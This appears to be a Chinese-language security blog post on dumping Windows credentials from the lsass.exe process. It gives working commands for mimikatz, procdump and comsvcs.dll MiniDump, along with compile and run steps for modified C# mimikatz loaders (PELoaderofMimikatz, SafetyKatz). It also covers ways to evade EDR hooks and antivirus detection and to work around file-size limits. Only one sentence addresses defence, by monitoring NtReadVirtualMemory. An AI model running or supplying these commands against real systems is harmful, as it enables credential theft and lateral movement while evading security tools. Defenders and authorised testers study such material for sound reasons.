I".*<h2 id="0x00-前言">0x00 前言</h2>
<hr />

<p>本文将要结合自己的经验，介绍不同环境下从lsass.exe进程导出凭据的方法，结合利用思路，给出防御建议</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr />

<p>本文将要介绍以下内容：</p>

<ul>
  <li>从lsass.exe进程导出凭据的常用方法</li>
  <li>限制上传文件长度时导出凭据的方法</li>
  <li>限制下载文件长度时导出凭据的方法</li>
</ul>

<h2 id="0x02-从lsassexe进程导出凭据的常用方法">0x02 从lsass.exe进程导出凭据的常用方法</h2>
<hr />

<h3 id="1使用mimikatz直接导出凭据">1.使用mimikatz直接导出凭据</h3>

<p>直接从lsass.exe进程的内存中导出凭据，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe log "privilege::debug" "sekurlsa::logonPasswords full" exit
</code></pre></div></div>

<p>通常这种方式会被安全产品拦截</p>

<h3 id="2通过lsassexe进程的dmp文件导出凭据">2.通过lsass.exe进程的dmp文件导出凭据</h3>

<h4 id="1获得lsassexe进程的dmp文件">(1)获得lsass.exe进程的dmp文件</h4>

<ol>
  <li>procdump</li>
</ol>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre></div></div>

<ol>
  <li>c++实现</li>
</ol>

<p>https://github.com/killswitch-GUI/minidump-lib</p>

<ol>
  <li>powershell实现</li>
</ol>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</p>

<ol>
  <li>c#实现</li>
</ol>

<p>https://github.com/GhostPack/SharpDump</p>

<ol>
  <li>使用comsvcs.dll</li>
</ol>

<p>示例参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 C:\windows\system32\comsvcs.dll, MiniDump 808 C:\test\lsass.dmp full
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>使用comsvcs.dll的方法可参考之前的分析文章<a href="https://3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95">《MiniDumpWriteDump via COM+ Services DLL》的利用测试</a></p>

<p>以上方法在原理上都是通过API <code class="language-plaintext highlighter-rouge">MiniDumpWriteDump()</code>获得进程的dmp文件</p>

<p>而某些安全产品已经开始拦截这种行为，拦截的方法如下：</p>

<p>通过用户模式下的API hook，使用跳转(JMP)命令将<code class="language-plaintext highlighter-rouge">NtReadVirtualMemory()</code>的前5个字节修改为指向另一个内存地址</p>

<p>绕过思路：</p>

<p>使用正确的命令覆盖被修改的前5个字节或是重写一个<code class="language-plaintext highlighter-rouge">NtReadVirtualMemory()</code></p>

<p>参考资料：</p>

<p>https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6</p>

<p>开源工具：</p>

<p>https://github.com/outflanknl/Dumpert</p>

<p>如果这种方法仍然失败，可以尝试使用RPC控制lsass加载SSP的方式向lsass.exe进程注入dll，由dll来实现dump的功能</p>

<p>使用RPC控制lsass加载SSP可参考XPN开源的代码：</p>

<p>https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e</p>

<p>对此的分析文章<a href="https://3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8">《Mimikatz中SSP的使用》</a></p>

<p>由dll来实现dump的功能可参考以下代码：</p>

<p>https://github.com/outflanknl/Dumpert/blob/master/Dumpert-DLL/Outflank-Dumpert-DLL/Dumpert.c</p>

<h4 id="2从dmp文件导出凭据">(2)从dmp文件导出凭据</h4>

<p>成功获得了lsass.exe进程的dmp文件后，可以借助mimikatz导出凭据，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe log "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
</code></pre></div></div>

<h2 id="0x03-限制上传文件长度时导出凭据的方法">0x03 限制上传文件长度时导出凭据的方法</h2>
<hr />

<p>如果实际的测试环境对上传文件的长度做了限制，这里给出我的解决方法：上传.cs文件，借助测试环境默认安装的.Net环境，使用csc.exe进行编译</p>

<p>为了应对不同的测试环境，使用的代码应该支持.Net 3.5以及更高版本</p>

<h3 id="1使用c实现的mimikatz直接导出凭据">1.使用c#实现的mimikatz直接导出凭据</h3>

<p>Casey Smith已经实现了在c#文件中加载mimikatz，目前可供参考的代码地址：</p>

<p>https://github.com/re4lity/subTee-gits-backups/blob/master/PELoader.cs</p>

<p>需要注意的是这个代码封装的mimikatz版本为<code class="language-plaintext highlighter-rouge">mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 17 2015 00:14:48)</code></p>

<p>这个版本在执行命令<code class="language-plaintext highlighter-rouge">sekurlsa::logonpasswords</code>时导出的结果不全，默认无法导出hash</p>

<p>于是我在此基础上将mimikatz替换到新版本：<code class="language-plaintext highlighter-rouge">mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14</code></p>

<p>替换的方法是先将新版的mimikatz.exe进行Gzip压缩，再转换成base64编码，最后修改字符串<code class="language-plaintext highlighter-rouge">KatzCompressed</code>中的内容</p>

<p>生成新字符串<code class="language-plaintext highlighter-rouge">KatzCompressed</code>内容的c#代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/GzipandBase64.cs</p>

<p>可以通过csc.exe对其进行编译，支持.Net 3.5以及更高版本</p>

<p>代码执行后将生成的文件base64.txt中的内容替换字符串<code class="language-plaintext highlighter-rouge">KatzCompressed</code></p>

<p>原来版本的PELoader.cs因为使用了<code class="language-plaintext highlighter-rouge">.Add()</code>导致不支持.Net3.5，可以对此进行替换使其支持.Net3.5</p>

<p>最终经过修改的PELoader.cs(升级mimikatz，支持.Net3.5)我也上传到了github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/PELoaderofMimikatz.cs</p>

<p>可以通过csc.exe对其进行编译，支持.Net 3.5以及更高版本</p>

<p>编译命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe PELoaderofMimikatz.cs /unsafe

or

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe PELoaderofMimikatz.cs /unsafe
</code></pre></div></div>

<p>导出凭据的命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PELoaderofMimikatz.exe log "privilege::debug" "sekurlsa::logonPasswords full" exit
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>需要经过简单的修改，在程序中提前传入要执行的命令，可以使用InstallUtil.exe导出凭据，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoaderofMimikatzAuto.exe
</code></pre></div></div>

<p>通过这种方法，可以将.cs文件上传至目标测试环境，然后使用目标测试环境自带的.Net进行编译</p>

<h3 id="2使用c实现的代码获得lsassexe进程的dmp文件">2.使用c#实现的代码获得lsass.exe进程的dmp文件</h3>

<p>类似的开源代码有很多，我在<a href="https://github.com/GhostPack/SafetyKatz">SafetyKatz</a>的基础上做了简单的修改</p>

<p>修改后的代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/DumpLsass.cs</p>

<p>可以通过csc.exe对其进行编译，支持.Net 3.5以及更高版本</p>

<p>代码执行后在当前路径生成lsass.exe进程的dmp文件</p>

<p>获得了dmp文件后可以将其下载到本地再使用mimikatz导出凭据</p>

<h2 id="0x04-限制下载文件长度时导出凭据的方法">0x04 限制下载文件长度时导出凭据的方法</h2>
<hr />

<p>如果实际的测试环境对下载文件的长度做了限制(有时lsass.exe进程的dmp文件压缩后也有上百MB）</p>

<p>这里最简单的解决方法是对mimikatz做二次封装(删除不必要的功能，避免被查杀），在目标测试环境上从lsass.exe进程的dmp文件中导出凭据</p>

<p>这里可以参考SafetyKatz，地址如下：</p>

<p>https://github.com/GhostPack/SafetyKatz</p>

<p>SafetyKatz对mimikatz进行了二次修改并封装到字符串中，参照了Casey Smith在c#文件中加载mimikatz的方法，实现以下功能：</p>

<ol>
  <li>获得lsass.exe进程的dmp文件并保存到temp目录</li>
  <li>从dmp文件导出凭据</li>
  <li>删除dmp文件</li>
</ol>

<p>我们可以在SafetyKatz的源码中加入以下代码把封装好的exe进行还原</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FileStream fs = new FileStream(@"C:\test\1.exe", FileMode.Create);
fs.Write(unpacked, 0, unpacked.Length);
fs.Flush();
fs.Close();
</code></pre></div></div>

<p>可以看到封装的exe是修改过的mimikatz，默认会执行一些命令，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-2-22/2-1.png" alt="Alt text" /></p>

<p>我对SafetyKatz的代码做了简单的调整，使其支持.Net 3.5以及更高版本</p>

<p>修改后的代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SafetyKatz.cs</p>

<p>编译命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe SafetyKatz.cs /unsafe

or

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SafetyKatz.cs /unsafe
</code></pre></div></div>

<h2 id="0x05-防御检测">0x05 防御检测</h2>
<hr />

<p>利用的前提是攻击者已获得了系统的管理员权限，获得lsass.exe进程的dmp文件最终会调用<code class="language-plaintext highlighter-rouge">NtReadVirtualMemory()</code>，可以尝试对此进行监控</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr />

<p>本文介绍了不同环境下从lsass.exe进程导出凭据的方法，结合利用思路，给出防御建议</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET